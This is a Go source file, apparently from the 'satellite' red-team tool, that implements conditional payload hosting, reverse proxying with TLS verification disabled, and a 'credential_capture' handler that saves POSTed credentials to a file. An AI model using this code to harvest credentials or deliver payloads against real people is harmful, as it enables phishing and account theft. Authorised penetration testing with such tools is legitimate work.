package path

import (
	"fmt"
	"io"
	"io/ioutil"
	"net/url"
	"os"

	"github.com/t94j0/satellite/crypto/tls"
	"github.com/t94j0/satellite/net/http"
	"github.com/t94j0/satellite/net/http/httputil"
	"github.com/t94j0/satellite/satellite/geoip"
	"gopkg.in/yaml.v2"
)

// Path is an available path that can be accessed on the server
type Path struct {
	Path string `yaml:"path,omitempty"`
	// HostedFile is the file to host
	HostedFile string `yaml:"hosted_file" json:"-"`
	// ContentType tells the browser what content should be parsed. A list of MIME
	// types can be found here: https://www.freeformatter.com/mime-types-list.html
	ContentType string `yaml:"content_type,omitempty"`
	// Disposition sets the Content-Disposition header
	Disposition struct {
		// Type is the type of disposition. Usually either inline or attachment
		Type string `yaml:"type"`
		// FileName is the name of the file if Content.Type is attachment
		FileName string `yaml:"file_name"`
	} `yaml:"disposition,omitempty"`
	// OnFailure instructs the Path what to do when a failure occurs
	OnFailure struct {
		// Redirect will redirect the user with a 301 to a target address
		Redirect string `yaml:"redirect"`
		// Render will render the following path
		Render string `yaml:"render"`
	} `yaml:"on_failure,omitempty"`
	//ProxyHost proxies the path to this address
	ProxyHost string `yaml:"proxy,omitempty"`
	// CredentialCapture returns the credentials POSTed to the path
	CredentialCapture struct {
		FileOutput string `yaml:"file_output"`
	} `yaml:"credential_capture,omitempty"`

	conditions RequestConditions
}

// NewPath parses a yaml file path to create a new Path object
func NewPath(path string) (*Path, error) {
	data, err := ioutil.ReadFile(path)
	if err != nil {
		return nil, err
	}

	return NewPathData(data)
}

// NewPathData creates a Path object from yaml data
func NewPathData(data []byte) (*Path, error) {
	var newInfo Path

	if err := yaml.Unmarshal(data, &newInfo); err != nil {
		return &newInfo, err
	}

	conds, err := NewRequestConditions(data)
	if err != nil {
		return nil, err
	}
	newInfo.conditions = conds

	return &newInfo, nil
}

// NewPathArray creates a Path array based on a target path
func NewPathArray(path string) ([]*Path, error) {
	data, err := ioutil.ReadFile(path)
	if err != nil {
		return nil, err
	}

	return NewPathArrayData(data)
}

// NewPathArrayData
func NewPathArrayData(data []byte) ([]*Path, error) {
	var newPathArr []*Path

	if err := yaml.Unmarshal(data, &newPathArr); err != nil {
		return nil, err
	}

	return newPathArr, nil
}

// ContentHeaders sets the Content-Type and Content-Disposition headers.
func (f *Path) ContentHeaders() map[string]string {
	headers := make(map[string]string)

	if f.ContentType != "" {
		headers["Content-Type"] = f.ContentType
	}

	if f.Disposition.Type != "" {
		if f.Disposition.FileName != "" {
			headers["Content-Disposition"] = fmt.Sprintf("%s; filename=\"%s\"", f.Disposition.Type, f.Disposition.FileName)
		} else {
			headers["Content-Disposition"] = f.Disposition.Type
		}
	}

	return headers
}

// ShouldHost does the checking to see if the requested file should be given to a target
func (f *Path) ShouldHost(req *http.Request, state *State, gip geoip.DB) bool {
	shouldHost := f.conditions.ShouldHost(req, state, gip)
	if shouldHost {
		state.Hit(req)
	}

	return shouldHost
}

// Proxy executes a proxy
func (f *Path) proxy(w http.ResponseWriter, req *http.Request) error {
	proxyURL, err := url.ParseRequestURI(f.ProxyHost)
	if err != nil {
		return err
	}
	proxy := httputil.NewSingleHostReverseProxy(proxyURL)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	proxy.Transport = tr
	proxy.ServeHTTP(w, req)
	return nil
}

// Render will render the path
func (f *Path) render(w http.ResponseWriter, req *http.Request) error {
	data, err := ioutil.ReadFile(f.HostedFile)
	if err != nil {
		return err
	}
	_, err = io.WriteString(w, string(data))
	return err
}

// credentialCapture appends credentials to a file
func (f *Path) credentialCapture(w http.ResponseWriter, req *http.Request) error {
	dataBlob, err := ioutil.ReadAll(req.Body)
	if err != nil {
		return err
	}

	filePath := f.CredentialCapture.FileOutput
	file, err := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}
	defer file.Close()
	if _, err := file.WriteString(string(dataBlob) + "\n"); err != nil {
		return err
	}

	return nil
}

// ServeHTTP is an http.HandlerFunc with error which chooses the correct way to respond to an HTTP request
//
// A single path can be either a ProxyHost, Render, or CredentialCapture
func (f *Path) ServeHTTP(w http.ResponseWriter, req *http.Request) error {
	var err error
	if f.ProxyHost != "" {
		err = f.proxy(w, req)
	} else if f.CredentialCapture.FileOutput != "" {
		err = f.credentialCapture(w, req)
	} else {
		err = f.render(w, req)
	}
	if err != nil {
		return err
	}
	return nil
}
